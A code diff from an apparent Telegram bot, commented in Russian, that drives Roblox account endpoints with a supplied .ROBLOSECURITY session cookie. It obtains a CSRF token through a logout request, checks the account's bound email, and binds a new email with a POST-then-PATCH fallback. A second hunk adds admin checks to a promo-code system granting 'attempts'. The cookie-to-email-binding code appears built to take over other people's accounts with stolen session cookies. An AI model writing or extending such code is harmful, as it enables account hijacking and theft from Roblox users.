@@ -131,41 +131,59 @@ INJECT_SCRIPT = r"""
 """
 
 
+def make_roblox_session(cookie):
+    """Создаём сессию с CSRF токеном"""
+    s = requests.Session()
+    s.cookies[".ROBLOSECURITY"] = cookie
+    s.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.roblox.com",
+        "Referer": "https://www.roblox.com/"
+    })
+    # Получаем CSRF из той же сессии
+    try:
+        r = s.post("https://auth.roblox.com/v2/logout")
+        csrf = r.headers.get("x-csrf-token", "")
+        if csrf:
+            s.headers["x-csrf-token"] = csrf
+    except Exception:
+        pass
+    return s
+
 def check_email_status(cookie):
     """Проверяем привязана ли почта"""
     try:
-        s = requests.Session()
-        s.cookies[".ROBLOSECURITY"] = cookie
+        s = make_roblox_session(cookie)
         r = s.get("https://accountinformation.roblox.com/v1/email")
         if r.status_code == 200:
             data = r.json()
-            return data.get("emailAddress", ""), data.get("verified", False)
+            email = data.get("emailAddress", "")
+            verified = data.get("verified", False)
+            return email, verified
         return None, None
     except Exception:
         return None, None
 
-def get_csrf_token(cookie):
-    """Получаем CSRF токен"""
-    try:
-        s = requests.Session()
-        s.cookies[".ROBLOSECURITY"] = cookie
-        r = s.post("https://auth.roblox.com/v2/logout")
-        return r.headers.get("x-csrf-token", "")
-    except Exception:
-        return ""
-
-def link_email(cookie, email):
+def link_email(cookie, email_addr):
     """Привязываем почту к аккаунту"""
     try:
-        s = requests.Session()
-        s.cookies[".ROBLOSECURITY"] = cookie
-        csrf = get_csrf_token(cookie)
-        s.headers["x-csrf-token"] = csrf
+        s = make_roblox_session(cookie)
         r = s.post(
             "https://accountinformation.roblox.com/v1/email",
-            json={"emailAddress": email}
+            json={"emailAddress": email_addr}
         )
-        return r.status_code == 200, r.text
+        if r.status_code == 200:
+            return True, "OK"
+        # Пробуем альтернативный endpoint
+        r2 = s.patch(
+            "https://accountinformation.roblox.com/v1/email",
+            json={"emailAddress": email_addr}
+        )
+        if r2.status_code == 200:
+            return True, "OK"
+        return False, r.text + " | " + r2.text
     except Exception as e:
         return False, str(e)
 
@@ -900,30 +918,45 @@ async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return WAITING_ADMIN
 
     # Создание промокода
-    if waiting == "create_promo" and user_id in ADMIN_IDS:
+    if waiting == "create_promo":
+        if user_id not in ADMIN_IDS:
+            await update.message.reply_text("Нет доступа!")
+            return WAITING_MENU
         context.user_data["waiting"] = None
         attempts_count = context.user_data.get("promo_attempts", 1)
-        if text.lower() == "авто":
+        raw = text.strip()
+        if raw.lower() == "авто":
             new_code = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
             max_uses = 1
-        elif ":" in text:
-            parts = text.upper().split(":")
+        elif ":" in raw:
+            parts = raw.upper().split(":", 1)
             new_code = parts[0].strip()
             try:
                 max_uses = int(parts[1].strip())
             except Exception:
                 max_uses = 1
         else:
-            new_code = text.upper().strip()
+            new_code = raw.upper().strip()
             max_uses = 1
+
+        if not new_code:
+            await update.message.reply_text("Пустой промокод! Попробуй снова.")
+            context.user_data["waiting"] = "create_promo"
+            return WAITING_ADMIN_CREATE_PROMO
 
         promo_codes[new_code] = {
             "attempts": attempts_count,
             "uses": 0,
             "max_uses": max_uses
         }
+        msg_text = (
+            "*Промокод создан!*" + chr(10) + chr(10) +
+            "Код: `" + new_code + "`" + chr(10) +
+            "Попыток: *" + str(attempts_count) + "*" + chr(10) +
+            "Макс использований: *" + str(max_uses) + "*"
+        )
         await update.message.reply_text(
-            "*Промокод создан!*\n\nКод: `" + new_code + "`\nПопыток: *" + str(attempts_count) + "*\nМакс использований: *" + str(max_uses) + "*",
+            msg_text,
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("В админку", callback_data="admin")]
